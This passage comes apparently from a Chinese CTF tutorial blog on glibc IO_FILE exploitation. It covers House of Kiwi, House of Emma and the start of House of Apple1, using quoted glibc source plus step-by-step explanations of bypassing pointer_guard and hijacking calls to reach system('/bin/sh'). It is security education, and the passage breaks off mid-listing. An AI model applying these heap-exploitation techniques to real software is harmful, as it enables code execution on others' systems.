<li>第三次 _IO_FILE 首先调用 <code>_IO_str_overflow</code> 中的 <code>malloc</code> 将 <code>&amp;memcpy@got - 0x10</code> 申请出来，然后调用 <code>memcpy</code> 将 <code>memcpy@got</code> 覆盖为 <code>system</code> 函数地址，同时将 <code>&amp;memcpy@got - 0x10</code> 处写入 <code>/bin/sh</code> 字符串。</li>
<li>第四次 _IO_FILE 调用 <code>malloc</code> 再次将 <code>&amp;memcpy@got - 0x10</code> 申请出来然后调用 <code>memcpy</code> ，即 <code>system</code> 函数并传入 <code>&amp;memcpy@got - 0x10</code> 参数执行 <code>system(&quot;/bin/sh&quot;)</code> 。</li>
</ul>
<h2 id="House-of-Emma"><a href="#House-of-Emma" class="headerlink" title="House of Emma"></a>House of Emma</h2><p>如果 <code>vtable</code> 指向的 <code>_IO_file_jumps</code> 不可写，那么 House of Kiwi 这种攻击手法就会失效。这时候就需要考虑劫持 vtable 。但在新版 glibc ，之前的劫持 vtable 的方法已经失效。</p>
<ul>
<li>由于自 libc-2.24 起对 vtable 指向的地址范围有检查，因此不能随便将 vtable 劫持到某块伪造了 <code>_IO_jump_t</code> 的内存上。</li>
<li>自 glibc-2.28 起，<code>_IO_str_jumps</code> 上的 <code>_IO_str_finish</code> 不再调用 <code>_IO_strfile</code>（IO_FILE 结构体） 上的函数指针。</li>
</ul>
<p>因此需要寻找其他的危险函数来劫持程序流。</p>
<p>vtable 的合法范围内，还有另一个 <code>_IO_jump_t</code> 类型的函数表叫做 <code>_IO_cookie_jumps</code> ，其中有如下危险函数可供我们利用：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>_IO_cookie_file</code> 有如下定义：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>因此攻击手法与前面的 <code>_IO_str_jumps</code> 相似，不过需要绕过指针保护 <code>PTR_DEMANGLE</code> 。</p>
<p>通过分析汇编可知，这段宏定义的操作是将函数指针循环右移 11 位然后与 <code>fs:[0x30]</code> 异或得到真正的函数地址。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/36b26ac6e793533e1a7c4189e34d6baa.png"
                     
                ><br>我们知道， <code>fs:[0x28]</code> 是 tls 上存储的 canary，根据 <code>tcbhead_t</code> 结构体的定义，<code>fs[0x30]</code> 是 <code>pointer_guard</code> ，用于对指针进行加密。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sysdeps/x86_64/nptl/tls.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="type">void</span> *tcb;    <span class="comment">/* 指向TCB */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;       <span class="comment">/* 指向dtv数组 */</span></span><br><span class="line">  <span class="type">void</span> *self;   <span class="comment">/* 指向自身  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;    <span class="comment">/* canary值 */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  <span class="comment">/* 用于保护指针 */</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以先泄露堆地址和 libc 基地址，然后利用 large bin attack 在 tls 对应 <code>pointer_guard</code> 上写一个 chunk 地址，从而绕过指针保护。</p>
<p>在实际调试时可以利用 canary 等方法查找  <code>pointer_guard</code> 地址，然后在攻击时根据 libc 基地址定位 <code>pointer_guard</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/af639b064c55f2d2fc12070d4cf5e1a2.png"
                     
                ><br>与 house of kiwi 一样，house of emma 也是通过 <code>__malloc_assert</code> 触发漏洞，但是由于 <code>pointer_guard</code> 已被修改，原来受保护的函数指针都已经无法调用，因此要选择最早调用的 <code>vtable</code> 中的函数进行触发，因此这里选择下面这个调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  va_start (ap, fmt);</span><br><span class="line">  <span class="type">int</span> res = __vfxprintf (fp, fmt, ap, <span class="number">0</span>);</span><br><span class="line">  va_end (ap);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__vfxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">	     <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    fp = <span class="built_in">stderr</span>;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="type">int</span> res = locked_vfxprintf (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">locked_vfxprintf</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span></span><br><span class="line"><span class="params">		  <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_fwide (fp, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> vfprintf	__vfprintf_internal</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  outstring ((<span class="type">const</span> UCHAR_T *) format,</span><br><span class="line">	     lead_str_end - (<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)                          \</span></span><br><span class="line"><span class="meta">    do &#123;                                                \</span></span><br><span class="line"><span class="meta">        const void *string_ = (String);                 \</span></span><br><span class="line"><span class="meta">        done = outstring_func(s, string_, (Len), done); \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (done &lt; 0)                                   \</span></span><br><span class="line"><span class="meta">            goto all_done;                              \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PUT(F, S, N)	_IO_sputn ((F), (S), (N))  </span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">outstring_func</span> <span class="params">(FILE *s, <span class="type">const</span> UCHAR_T *<span class="built_in">string</span>, <span class="type">size_t</span> length, <span class="type">int</span> done)</span></span><br><span class="line">&#123;</span><br><span class="line">  assert ((<span class="type">size_t</span>) done &lt;= (<span class="type">size_t</span>) INT_MAX);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>) PUT (s, <span class="built_in">string</span>, length) != (<span class="type">size_t</span>) (length))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> done_add_func (length, done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里以同名题目<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house%20of%20emma" >2021湖湘杯 house of emma<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 为例讲解利用过程：</p>
<p>在利用 UAF 泄露 libc 和堆地址后，利用 2 次 large bin attack 分别覆盖 <code>pointer_guard</code> 和 <code>stderr</code> 指针为某 chunk 地址，然后作如下图所示构造。最后通过 <code>__malloc_asserrt</code> 触发漏洞。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/a581688d6d87d4545d97df1aa93eb4db.png"
                     
                ></p>
<p>需要注意的是，由于伪造的 IO_FILE 的 flag 的 <code>_IO_USER_LOCK</code>（0x8000）没有置位，因此在 <code>__vfxprintf</code> 函数中会执行如下代码：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/9197cd36b1e6a2381782a2a0dd8b4a17.png"
                     
                ><br>因此伪造的 IO_FILE 的 <code>_lock</code> 应该指向可读写的内存。</p>
<h2 id="House-of-Apple1"><a href="#House-of-Apple1" class="headerlink" title="House of Apple1"></a>House of Apple1</h2><p>在 IO_FILE 结构体中存在指针 <code>_wide_data</code> 指向一块 <code>_IO_wide_data</code> 类型的内存，<code>_IO_wide_data</code> 类型定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>通过 <code>_IO_wstrn_overflow</code> 函数可以在 <code>_wide_data</code> 指向的内存中写入连续 8 个 <code>snf-&gt;overflow_buf</code> 开始或结束位置的值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wsetb (FILE *f, <span class="type">wchar_t</span> *b, <span class="type">wchar_t</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_wide_data-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wstrn_overflow (FILE *fp, <span class="type">wint_t</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* When we come to here this means the user supplied buffer is</span></span><br><span class="line"><span class="comment">     filled.  But since we must return the number of characters which</span></span><br><span class="line"><span class="comment">     would have been written in total we must provide a buffer for</span></span><br><span class="line"><span class="comment">     further use.  We can do this by writing on and on in the overflow</span></span><br><span class="line"><span class="comment">     buffer in the _IO_wstrnfile structure.  */</span></span><br><span class="line">  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_wsetb (fp, snf-&gt;overflow_buf,</span><br><span class="line">		 snf-&gt;overflow_buf + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">				      / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf</span><br><span class="line">				      + (<span class="keyword">sizeof</span> (snf-&gt;overflow_buf)</span><br><span class="line">					 / <span class="keyword">sizeof</span> (<span class="type">wchar_t</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Since we are not really interested in storing the characters</span></span><br><span class="line"><span class="comment">     which do not fit in the buffer we simply ignore it.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>_IO_wstrnfile</code> 相关定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE _f;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* These members are preserved for ABI compatibility.  The glibc</span></span><br><span class="line"><span class="comment">     implementation always calls malloc/free for user buffers if</span></span><br><span class="line"><span class="comment">     _IO_USER_BUF or _IO_FLAGS2_USER_WBUF are not set.  */</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer_unused;</span><br><span class="line">  _IO_free_type _free_buffer_unused;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span 